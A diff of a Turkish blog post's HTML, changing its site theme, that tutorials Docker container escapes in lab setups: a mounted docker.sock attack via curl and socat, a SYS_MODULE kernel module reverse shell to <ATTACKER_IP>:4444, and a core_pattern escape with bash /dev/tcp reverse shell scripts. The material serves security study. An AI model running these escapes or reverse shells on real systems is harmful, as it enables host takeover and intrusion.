 </span></span></code></pre></div><p><code>curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json</code>: Komutu ile hostta çalışan bütün konteyner&rsquo;ları listeleyebiliyoruz. Burada <strong>&ndash;unix-socket</strong> &rsquo;e kullanmasını istediğimiz socket&rsquo;i veriyoruz.</p>
 <p><code>curl -XPOST -H &quot;Content-Type: application/json&quot; --unix-socket /var/run/docker.sock -d &quot;$(cat container.json)&quot; http://localhost/containers/create</code>: Komutu ile üstte yazdığımız json&rsquo;u kullanarak zafiyetli konteyner&rsquo;ı oluşturuyoruz. Alttaki gibi bir çıktı alacaksınız. Burada ilk Id kısmı işimize yaracaktır.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">Response</span> <span class="p">{</span><span class="nt">&#34;Id&#34;</span><span class="p">:</span><span class="s2">&#34;f9ca25e4e3e4d749029a0cb96e44166378dda1ddc4f890f22bb6c371800e523f&#34;</span><span class="p">,</span><span class="nt">&#34;Warnings&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Response</span> {<span style="color:#f92672">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;f9ca25e4e3e4d749029a0cb96e44166378dda1ddc4f890f22bb6c371800e523f&#34;</span>,<span style="color:#f92672">&#34;Warnings&#34;</span>:<span style="color:#66d9ef">null</span>}
 </span></span></code></pre></div><p><code>curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/&lt;CID&gt;/start</code>: Komutu ile CID kısmına yukarıdaki Id nin ilk 4 karakterini yazarak oluşturduğumuz konteyner&rsquo;ı çalıştırıyoruz.</p>
 <p>Bütün bunları yaptıktan sonra zafiyetli çalışan bir konteyner&rsquo;ımız var. Şimdi yapmamız gereken buna bağlanmak. Bunun için <strong>socat</strong> kullanacağız.</p>
 <p><code>socat - UNIX-CONNECT:/var/run/docker.sock</code>: Yazarak <strong>docker.sock</strong> a bağlanıyoruz. Bu bağlantının içinde alttaki http requestini yazarak kendimize TCP bağlantısı alıyoruz.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP/1.1" data-lang="HTTP/1.1"><span class="line"><span class="cl">POST /containers/&lt;CID&gt;/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
-</span></span><span class="line"><span class="cl">Host:
-</span></span><span class="line"><span class="cl">Connection: Upgrade
-</span></span><span class="line"><span class="cl">Upgrade: tcp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP/1.1" data-lang="HTTP/1.1"><span style="display:flex;"><span>POST /containers/&lt;CID&gt;/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
+</span></span><span style="display:flex;"><span>Host:
+</span></span><span style="display:flex;"><span>Connection: Upgrade
+</span></span><span style="display:flex;"><span>Upgrade: tcp
 </span></span></code></pre></div><p>Shell geldiğinde <code>cd /host/home</code> gidersek host&rsquo;un dosyalarını bulabilirsiniz.</p>
-<h4 id="excessive-capabilities">
-  Excessive Capabilities
-  <a class="heading-link" href="#excessive-capabilities">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h4 id="excessive-capabilities">Excessive Capabilities</h4>
 <p>Bu örnekte bir konteyner&rsquo;a aşırı yetenek eklendiğinde çıkan sorunlardan birini işleyeceğiz. Burada fazladan <strong>SYS_MODULE</strong> yeteneği eklenmiş ve bunun ne işe yaradığını üst tarafta anlattık.</p>
 <p><strong>Zafiyetli Makina</strong>: <code>docker run -it –rm –cap-add SYS_MODULE sysmodule</code></p>
 <p>Buradaki sıkıntı yine dediğim gibi <strong>SYS_MODULE</strong> yeteneğinin konteyner&rsquo;a eklenmiş olmasıdır.</p>
@@ -413,53 +346,41 @@
 <p><strong>Exploit</strong></p>
 <p>Bu exploit&rsquo;i yaparken bize iki adet dosya lazım. Biri <strong>revshell.c</strong> diğeri de <strong>Makefile</strong></p>
 <p>Altta revshell.c nin içeriğini görebilirsiniz</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;linux/init.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;linux/kmod.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="nf">MODULE_LICENSE</span><span class="p">(</span><span class="s">&#34;GPL&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">start_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span><span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="s">&#34;bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0&gt;&amp;1&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl"><span class="s">&#34;HOME=/&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s">&#34;TERM=linux&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl"><span class="s">&#34;PATH=/sbin:/bin:/usr/sbin:/usr/bin&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nf">call_usermodehelper</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="n">env</span><span class="p">,</span> <span class="n">UMH_WAIT_PROC</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">init_mod</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nf">start_shell</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">exit_mod</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-</span></span><span class="line"><span class="cl"><span class="k">return</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="nf">module_init</span><span class="p">(</span><span class="n">init_mod</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nf">module_exit</span><span class="p">(</span><span class="n">exit_mod</span><span class="p">);</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;linux/init.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;linux/module.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;linux/kmod.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MODULE_LICENSE</span>(<span style="color:#e6db74">&#34;GPL&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">start_shell</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[] <span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0&gt;&amp;1&#34;</span>, NULL};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>env[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;HOME=/&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;TERM=linux&#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;PATH=/sbin:/bin:/usr/sbin:/usr/bin&#34;</span>, NULL };
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">call_usermodehelper</span>(argv[<span style="color:#ae81ff">0</span>], argv, env, UMH_WAIT_PROC);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">init_mod</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#a6e22e">start_shell</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">exit_mod</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_init</span>(init_mod);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module_exit</span>(exit_mod);
 </span></span></code></pre></div><p>Bu da bizim makefile dosyamız olacaktır.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">obj-m</span> <span class="o">+=</span>revshell.o
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nf">all</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">	make -C /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> modules
-</span></span><span class="line"><span class="cl"><span class="nf">clean</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">	make -C /lib/modules/<span class="k">$(</span>shell uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span><span class="k">$(</span>PWD<span class="k">)</span> clean
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-makefile" data-lang="makefile"><span style="display:flex;"><span>obj-m <span style="color:#f92672">+=</span>revshell.o
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">all</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	make -C /lib/modules/<span style="color:#66d9ef">$(</span>shell uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> modules
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">clean</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>	make -C /lib/modules/<span style="color:#66d9ef">$(</span>shell uname -r<span style="color:#66d9ef">)</span>/build M<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>PWD<span style="color:#66d9ef">)</span> clean
 </span></span></code></pre></div><p>Zafiyetli makineye girdiğimiz de ilk olarak kendi ip&rsquo;mizi <code>ifconfig</code> ile alıp revshell.c nin içerisine atmaktır. Arından zafiyetli makinede başka bir shell alıp orada <code>nc -lvnp 4444</code> ile dinlemeye başlamaktır.</p>
 <p>Bundan sonra gidip ilk olarak <code>make</code> atacağız ki modülümüz derlensin. Arından <code>insmod revshell.ko</code> yazarak modülümüzü yüklüyoruz. Bunların hepsini doğru yapılırsa dinleme yaptığımız yere shell gelmiş olacaktır.</p>
-<h3 id="15-kernel-exploitation">
-  1.5 Kernel Exploitation
-  <a class="heading-link" href="#15-kernel-exploitation">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<h4 id="core-pattern">
-  Core Pattern
-  <a class="heading-link" href="#core-pattern">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h4>
+<h3 id="15-kernel-exploitation">1.5 Kernel Exploitation</h3>
+<h4 id="core-pattern">Core Pattern</h4>
 <p><strong>core_pattern</strong>: Linux işletim sistemi çekirdeğinde çökmelerde oluşan çekirdek döküm dosyalarının adını ve konumunu belirleyen bir sistem ayarıdır.</p>
 <p>Bu zafiyet core_pattern dosyası sayeside vardır. Bu zafiyet için ya makinede privilege escalation yapmamız gerekiyor. Ya da düzgün apparmor&rsquo;un kapalı olması gerekiyor</p>
 <p><strong>Requirements</strong></p>
@@ -474,118 +395,149 @@
 <p><strong>Zafiyetli Makina</strong>: <code>docker run -it --rm --cap-add=SYS_ADMIN --secuity-opt apparmor:unconfined corepattern bash</code></p>
 <p>Burada ilk olarak <strong>crash.c</strong> diye bir c kodumuz olucak. Bu kodun tek amacı bize Segmantation Fault vermesi olucak. Bu kod sayesinde bizim <strong>core_pattern</strong> tetiklenecek.</p>
 <p>Birde <strong>shell.sh</strong> kodumuz olucak bu bildiğimiz basit bir reverse shell kodu. Alttaki gibidir.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>/bin/bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>/bin/bash -c <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#34;</span>
 </span></span></code></pre></div><p>Son olarak <strong>escape.sh</strong> kodumuz olucak bu kod sayesinde kaçma işlemini yapacağız.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="nv">overlay</span><span class="o">=</span><span class="sb">`</span>sed -n <span class="s1">&#39;s/overlay \/ .*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span class="sb">`</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">mkdir /newproc
-</span></span><span class="line"><span class="cl">mount -t proc proc /newproc
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /newproc/sys/kernel
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;|</span><span class="nv">$overlay</span><span class="s2">/need/shell.sh&#34;</span> &gt; core_pattern
-</span></span><span class="line"><span class="cl">sleep <span class="m">6</span>
-</span></span><span class="line"><span class="cl">/crash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>overlay<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/overlay \/ .*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mkdir /newproc
+</span></span><span style="display:flex;"><span>mount -t proc proc /newproc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cd /newproc/sys/kernel
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;|</span>$overlay<span style="color:#e6db74">/need/shell.sh&#34;</span> &gt; core_pattern
+</span></span><span style="display:flex;"><span>sleep <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>/crash
 </span></span></code></pre></div><p>Şimdi kodu anlatalım. Yukarıda anlattığımız overlay pathini ilk satırda alıyoruz. Bu path yardımı ile <strong>host&rsquo;un</strong> bizim <strong>shell.sh</strong> dosyamızı çalıştırmasını sağlayacağız.</p>
 <p>Host&rsquo;un proc&rsquo;larını mount etmek için yeni klasör oluşturuyoruz ve oraya mount ediyoruz. Bu şekilde hostun proc dosyalarını konteyner içinde görebilir, değiştirebiliriz.</p>
 <p>Bu dosyaların içinden <strong>/sys/kernel</strong> da bizim <em>core_pattern</em> dosyamız bulunmakta bu dosyanın içine <code>echo &quot;|$overlay/shell.sh&quot; &gt; core_pattern</code> ile shell.sh dosyasının path&rsquo;ini belirtiyoruz. Arından 6 saniye bekleyip /crash dosyasını çalıştırıyoruz.</p>
 <p>/crash dosyası <em>Segmantation Fault</em> hatası verince <em>core_pattern</em> dosyası okunuyor, okunurken bizim path&rsquo;imi ve başıdaki <strong>|</strong> ı görüp o dosyayı çalıştırıyor. Bu da bize host&rsquo;a bağlantı veriyor.</p>
 <p>Tabiki <strong>escape.sh</strong>&lsquo;ı çalıştırmadan önce <code>nc -lvnp 4444</code> ile dinlemeye almalıyız.</p>
-<h2 id="kaynakça">
-  Kaynakça
-  <a class="heading-link" href="#kaynak%c3%a7a">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
+<h2 id="kaynakça">Kaynakça</h2>
 <!-- raw HTML omitted -->
 <ul>
-<li><a href="https://tryhackme.com/room/introtodockerk8pdqk"  class="external-link" target="_blank" rel="noopener">Intro to Docker LAB</a></li>
-<li><a href="https://www.youtube.com/watch?v=4XVfmGE1F_w&amp;t=922s&amp;ab_channel=kablosuzkedi"  class="external-link" target="_blank" rel="noopener">Kablosuz Kedi</a></li>
-<li><a href="https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities"  class="external-link" target="_blank" rel="noopener">All You Need Is Cap</a></li>
-<li><a href="https://www.youtube.com/watch?v=iALZWtWwRyc&amp;ab_channel=RSAConference"  class="external-link" target="_blank" rel="noopener">All You Need Is Cap Video</a></li>
-<li><a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities"  class="external-link" target="_blank" rel="noopener">Excessive Capabilities</a></li>
-<li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes"  class="external-link" target="_blank" rel="noopener">Understanding Docker Escapes</a></li>
-<li><a href="https://www.youtube.com/watch?v=BQlqita2D2s&amp;ab_channel=BlackHat"  class="external-link" target="_blank" rel="noopener">Best One</a></li>
-<li><a href="https://earthly.dev/blog/intro-to-linux-capabilities/"  class="external-link" target="_blank" rel="noopener">Linux Capabilities</a></li>
-<li><a href="https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/"  class="external-link" target="_blank" rel="noopener">RunC Check</a></li>
-<li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/"  class="external-link" target="_blank" rel="noopener">CVE-2019-5736</a></li>
-<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC"  class="external-link" target="_blank" rel="noopener">Runc PoC</a></li>
+<li><a href="https://tryhackme.com/room/introtodockerk8pdqk">Intro to Docker LAB</a></li>
+<li><a href="https://www.youtube.com/watch?v=4XVfmGE1F_w&amp;t=922s&amp;ab_channel=kablosuzkedi">Kablosuz Kedi</a></li>
+<li><a href="https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities">All You Need Is Cap</a></li>
+<li><a href="https://www.youtube.com/watch?v=iALZWtWwRyc&amp;ab_channel=RSAConference">All You Need Is Cap Video</a></li>
+<li><a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities">Excessive Capabilities</a></li>
+<li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes">Understanding Docker Escapes</a></li>
+<li><a href="https://www.youtube.com/watch?v=BQlqita2D2s&amp;ab_channel=BlackHat">Best One</a></li>
+<li><a href="https://earthly.dev/blog/intro-to-linux-capabilities/">Linux Capabilities</a></li>
+<li><a href="https://www.docker.com/blog/docker-security-advisory-multiple-vulnerabilities-in-runc-buildkit-and-moby/">RunC Check</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">CVE-2019-5736</a></li>
+<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">Runc PoC</a></li>
 </ul>
 <!-- raw HTML omitted -->
 
-  </article>
-</section>
-
-  
-
+        
     </div>
 
-    <footer class="footer">
-  <section class="container">
-    ©
+    <div class="prev-next">
+        
+    </div>
+
     
-      2019 -
     
-    2024
-     Çetin Boran Mesüm 
-    ·
+    <svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="topFunction()" title="Go to top">
+        
+        <path d="M177 159.7l136 136c9.4 9.4 9.4 24.6 0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9 0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9 0L7 329.7c-9.4-9.4-9.4-24.6 0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/>
+    </svg>
+    <script>
+        let backToTopButton = document.getElementById("btt-button");
+
+        window.onscroll = function() {
+            scrollFunction()
+        };
+
+        function scrollFunction() {
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                backToTopButton.style.display = "block";
+            } else {
+                backToTopButton.style.display = "none";
+            }
+        }
+
+        function topFunction() {
+            smoothScrollToTop();
+        }
+
+        function smoothScrollToTop() {
+            const scrollToTop = () => {
+                const c = document.documentElement.scrollTop || document.body.scrollTop;
+                if (c > 0) {
+                    window.requestAnimationFrame(scrollToTop);
+                    window.scrollTo(0, c - c / 8);
+                }
+            };
+            scrollToTop();
+        }
+    </script>
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
-  </section>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#docker-escape">Docker Escape</a>
+      <ul>
+        <li><a href="#1-docker-escape">1. Docker Escape</a>
+          <ul>
+            <li><a href="#11-basics">1.1 Basics</a>
+              <ul>
+                <li><a href="#111-capabilities">1.1.1 Capabilities</a></li>
+                <li><a href="#112-overlayfs-overlay-file-system">1.1.2 OverlayFS (Overlay File System)</a></li>
+                <li><a href="#113-namespaces">1.1.3 Namespaces</a></li>
+                <li><a href="#114-cgroups">1.1.4 CGroups</a></li>
+                <li><a href="#115--linux-security-modules-lsm">1.1.5 – Linux Security Modules (LSM)</a></li>
+              </ul>
+            </li>
+            <li><a href="#12-docker-escape">1.2 Docker Escape</a></li>
+            <li><a href="#13-engine-vulnerabilities">1.3 Engine Vulnerabilities</a>
+              <ul>
+                <li><a href="#runc">RunC</a></li>
+                <li><a href="#cve-2019-5736">CVE 2019-5736</a></li>
+              </ul>
+            </li>
+            <li><a href="#14-weak-deployment">1.4 Weak Deployment</a>
+              <ul>
+                <li><a href="#mounted-docker-socket">Mounted Docker Socket</a></li>
+                <li><a href="#exploit">Exploit</a></li>
+                <li><a href="#excessive-capabilities">Excessive Capabilities</a></li>
+              </ul>
+            </li>
+            <li><a href="#15-kernel-exploitation">1.5 Kernel Exploitation</a>
+              <ul>
+                <li><a href="#core-pattern">Core Pattern</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#kaynakça">Kaynakça</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>&copy; 2024 Çetin Boran Mesüm</span>
+    
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
 </footer>
-
-  </main>
-
-  
-
-  
-  
-  <script src="/js/coder.js"></script>
-  
-
-  
-
-  
-
-
-  
-  
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
 </body>
-
 </html>
